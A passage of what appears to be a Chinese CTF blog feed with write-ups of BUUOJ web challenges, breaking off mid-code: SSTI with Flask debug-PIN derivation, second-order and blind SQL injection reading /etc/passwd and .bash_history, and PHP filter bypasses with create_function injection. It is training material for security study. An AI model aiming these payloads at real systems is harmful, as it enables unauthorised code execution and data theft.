$this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a &#x3D; $_POST[&#39;aa&#39;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/a3320315/article/details/103760266" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/103760266</a></p><p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(三)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p><p>[<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]</a>(<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019</a> wp/#web6)</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-web刷题（一）</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-CISCN2019-华东南赛区-Double-Secret"><a href="#0x-01-CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="0x 01 [CISCN2019 华东南赛区]Double Secret"></a>0x 01 [CISCN2019 华东南赛区]Double Secret</h3><ul><li>考点</li></ul><p>ssti、Flask debug pin安全问题                </p><ul><li>解题过程</li></ul><p>超过四位的字符加密会报错, 报错信息中可以看到部分源码</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222846945.png" alt></p><p>将要加密的东西换成%ff, 又爆出了源码</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222934076.png" alt></p><p>解法一：</p><p>ssti读取flag文件</p><p>利用工具CyberChef或者使用脚本加密</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225621819.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key &#x3D; key</span><br><span class="line">        self.key_length &#x3D; len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box &#x3D; [i for i in range(256)]</span><br><span class="line">        k &#x3D; [self.key[i % self.key_length] for i in range(256)]</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        for i in range(256):</span><br><span class="line">            j &#x3D; (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        result &#x3D; &#39;&#39;</span><br><span class="line">        for ch in plaintext:</span><br><span class="line">            i &#x3D; (i + 1) % 256</span><br><span class="line">            j &#x3D; (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line">            t &#x3D; (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result +&#x3D; chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">a &#x3D; RC4(&#39;HereIsTreasure&#39;)</span><br><span class="line">cmd &#x3D; &quot;&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#39;&#x2F;flag.txt&#39;).read() &#125;&#125;&quot;</span><br><span class="line">payload &#x3D; urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res &#x3D; requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>解法二：</p><p>Flask debug pin安全问题执行shell</p><p>参考：<a href="https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg</a></p><ul><li>生成pin码必要文件：<ul><li>username #用户名，可以查看/etc/passwd或者读取/proc/self/environ环境变量</li><li>modename #flask.app</li><li>getattr(app,’<strong>name</strong>‘,getattr(app.<strong>class</strong>,’<strong>name</strong>‘)) # Flask</li><li>getattr(mod,’<strong>file</strong>‘,None) #app.py的绝对路径</li><li>uuid.getnode() #mac地址十进制</li><li>get_machine_id() #docker环境下读取/proc/self/cgroup 其余依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件</li></ul></li></ul><p>依次需要获取6个变量，首先是用户名，我采用的办法是读取/proc/self/environ环境变量的办法，加密生成读取文件的payload：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225842982.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225820453.png" alt>可见username的值为glzjin</p><p>然后是modname，依然为flask.app</p><p>第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>依然为Flask</p><p>第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>要注意，服务器上python2的安装路径和我们本地的可不太一样，这可以从报错猜测这个值应该为<code>/usr/local/lib/python2.7/site-packages/flask/app.pyc</code></p><p>随后是str(uuid.getnode())的值，读取服务器的/sys/class/net/eth0/address文件，其结果为：<code>02:42:ae:00:9e:fc</code>,写一个脚本转换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*-coding:utf8-*-</span><br><span class="line">machex &#x3D; &quot;0x&quot;+&quot;02:42:ae:00:9e:fc&quot;.replace(&#39;:&#39;,&#39;&#39;)</span><br><span class="line">print int(machex,16)</span><br><span class="line">### output</span><br><span class="line">2485410373372</span><br></pre></td></tr></table></figure><p>首先尝试打开/proc/self/cgroup文件，读取第一行，并将/docker/字符串后面的内容作为该函数的返回值，如果该文件不存在或者该值不存在，才会走入师傅们文章中提到的依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件的流程</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230454251.png" alt></p><p>那么它的get_machine_id()的返回值就应该是第一行/docker/后面的那部分，即</p><p>a8832ad13feb717ec6ae4c2f4a79b79b64c63329bd5497b7ab3f1b055860e5b8</p><p>至此，所有参数获取完毕，输入payload计算pin码：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230746497.png" alt></p><p>在报错页面中输入pin码，成功打开python shell,剩下就是读取flag了</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230827937.png" alt></p><p>参考资料：</p><blockquote><p> 从一道ctf题谈谈flask开启debug模式存在的安全问题 </p><p><a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p><p><a href="https://eustiar.com/archives/576" target="_blank" rel="noopener">https://eustiar.com/archives/576</a></p><p><a href="https://ch4ser-go.github.io/2019/05/27/SSTI/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/05/27/SSTI/</a></p></blockquote><h3 id="0x-02-网鼎杯-2018-Comment"><a href="#0x-02-网鼎杯-2018-Comment" class="headerlink" title="0x 02 [网鼎杯 2018]Comment"></a>0x 02 [网鼎杯 2018]Comment</h3><ul><li>考点</li></ul><p>git泄露、SQL二次注入</p><ul><li>解题过程</li></ul><ol><li>控制台提示存在git泄露，使用GitHack泄露代码得到</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213104847569.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后发现可以构成二次注入,思路是这样的:</p><p>观察了一下发现是两张表 board 、comment</p><p>首先写评论的时候数据写到board  然后再次评论的时候  category这个变量会从 board<br> 表中读取然后构成二次注入</p><p>如下图：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180830132920-a53543fe-ac15-1.png" alt="img"></p><p> 发帖后302到登录页面，爆破得知密码是zhangwei666</p><p>登录以后，进行发帖。开始构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>这里是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105247233.png" alt></p><p>然后再在评论里 */#</p><p>则拼接后的sql语句就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;123&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">                content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*&#39;,</span><br><span class="line">       content &#x3D; &#39;*&#x2F;#&#39;,</span><br></pre></td></tr></table></figure><p>被注释了，语句仍然是正常的sql语句。</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105426900.png" alt></p><p>看history文件</p><p>首先常规的读文件payload:123’,content=(select( load_file(‘/etc/passwd’))),/*</p><p>看到www用户的目录：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105627505.png" alt></p><p>发现一个www用户,看看用户的命令记录</p><p><code>123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213120311956.png" alt></p><blockquote><p>先在/tmp目录下解压压缩包</p><p>然后删除压缩包</p><p>再将html目录复制到/var/www/目录下</p><p>切换到/var/www/html，然后删除.DS_Store</p><p>但是并没有删除/tmp/html 目录下的，所以我们可以读取此文件~~</p></blockquote><p> 在/tmp/html下有个.DS_Store文件，用hex编码显示</p><p>payload: ‘, content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</p><p>解密一下</p><p><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a></p><p>发现文件名<code>flag_8946e1ff1ee3e40f.php</code><br> payload：<code>123&#39;, content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213121254435.png" alt></p><blockquote><p>参考资料</p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://xz.aliyun.com/t/2667#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2667#toc-1</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11649255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Tkitn/p/11649255.html</a></p></blockquote><h3 id="0x-03-BJDCTF2020-EzPHP"><a href="#0x-03-BJDCTF2020-EzPHP" class="headerlink" title="0x 03 [BJDCTF2020]EzPHP"></a>0x 03 [BJDCTF2020]EzPHP</h3><p>主页源代码处发现<code>GFXEIM3YFZYGQ4A=</code>，base32解密后得到1nD3x.php，访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure><ul><li>考点一：绕过QUERY_STRING的正则匹配</li></ul><p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行URLDecode，而<code>$_GET[]</code>会，所以只要进行url编码即可绕过</p><ul><li><p>考点二：绕过debu的正则匹配</p><p>可以使用<code>%0a</code>换行污染绕过</p></li><li><p>考点三：绕过$_REQUEST的字母匹配</p></li></ul><p><code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值，因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过</p><ul><li>考点4：绕过文件内容读取的比较</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;data:text&#x2F;plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><ul><li><p>考点5：绕过sha1比较</p><p>数组绕过即可</p></li><li><p>考点6：create_function()代码注入</p></li><li><p>考点7：获得flag</p></li></ul><p>综上payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">%64%65%62%75&#x3D;1&amp;file&#x3D;1</span><br><span class="line"></span><br><span class="line">url解码后：</span><br><span class="line">&#x2F;1nD3x.php?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>得到回显：</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213180730536.png" alt></p><p>取反绕过+伪协议读源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1nD3x.php?%64%65%62%75&#x3D;%61qua%5fis%5fcut%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">url解码结果：</span><br><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1flag.php);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>生成poc脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;</span><br><span class="line">$arr1 &#x3D; explode(&#39; &#39;, $a);</span><br><span class="line">echo &quot;&lt;br&gt;~(&quot;;</span><br><span class="line">foreach ($arr1 as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">echo &quot;%&quot;.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;)&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p>补充：因为<code>preg_match()</code>只能匹配字符串，数组可以绕过</p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/websecurity/770.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/770.html</a></p><p><a href="https://imagin.vip/?p=166" target="_blank" rel="noopener">https://imagin.vip/?p=166</a></p></blockquote><h3 id="0x-04-网鼎杯2018-Unfinish"><a href="#0x-04-网鼎杯2018-Unfinish" class="headerlink" title="0x 04 [网鼎杯2018]Unfinish"></a>0x 04 [网鼎杯2018]Unfinish</h3><ul><li>考点</li></ul><p>SQL花式盲注、二次注入</p><ul><li>解题过程</li></ul><ol><li>题目存在注册界面，尝试进行二次注入</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line"># 对应后台语句为</span><br><span class="line">insert into users(email,username,password) values (&#39;aa&#39;,&#39;&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1&#39;,&#39;bb&#39;)</span><br></pre></td></tr></table></figure><p>存在延时，可以进行注入，编写exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 